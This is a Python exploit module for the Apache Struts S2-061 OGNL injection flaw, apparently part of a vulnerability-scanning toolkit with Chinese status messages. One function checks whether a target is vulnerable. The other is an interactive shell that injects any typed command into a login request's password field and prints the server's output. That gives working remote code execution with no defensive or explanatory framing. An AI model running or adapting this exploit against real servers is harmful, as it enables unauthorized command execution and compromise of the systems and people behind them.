#!/usr/bin/env python
# coding=utf-8
import base64
import urllib
import requests
import urllib3
urllib3.disable_warnings()
from module.proxy import proxies
from module.color import color
from requests.exceptions import ConnectionError
from requests.exceptions import ConnectTimeout
from requests.exceptions import Timeout
import re


def s2_061(url):
    vul_nname = "s2_061"
    cmd = "echo 78468794903108696"
    headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69",
        "Content-type" : "application/x-www-form-urlencoded",
    }
    payload = {
        'username':'111111',
        'password':"{(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'"+cmd+"'}))}",
    }
    try:
        vurl = urllib.parse.urljoin(url, '/login.action')
        req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False,proxies = proxies)
        if "78468794903108696" in req.text and re.search("echo.{0,10}" + "78468794903108696", req.text) == None:
            print(color.red("[+]")+"存在漏洞：%s" % vul_nname)
    except:
        pass

def s2_061_exp(url):
    first = True
    while 1:
        if first:
            cmd = "echo 78468794903108696"
        else:
            try:
                cmd = input("> ")
                if cmd == '':continue
                if cmd == 'exit':exit()
            except:exit()
        
        
        headers = {
            "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69",
            "Content-type" : "application/x-www-form-urlencoded",
        }
        payload = {
            'username':'111111',
            'password':"{(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'"+cmd+"'}))}",
        }

        try:
            vurl = urllib.parse.urljoin(url, '/login.action')
            req = requests.post(vurl, data=payload, headers=headers, timeout=15, verify=False,proxies = proxies,allow_redirects=False)
            if "78468794903108696" not in req.text:
                print(color.red("[!]不存在该漏洞"))
                break
            elif first:
                first = False
                number1 = req.text.index("78468794903108696")
                afterstring = req.text[number1+len("78468794903108696"):number1+len("78468794903108696")+30]
            else:
                number2 = req.text.index(afterstring) 
                print(urllib.parse.unquote(req.text[number1:number2]))
            
        except ConnectionError as e:  
            print("[!]网络链接错误/代理异常")
            exit()
        except ConnectTimeout as e:  
            print("[!]连接远程服务器超时异常")
            exit()
        except Timeout as e:  
            print("[!]请求URL超时，产生超时异常")
            exit()
        except:pass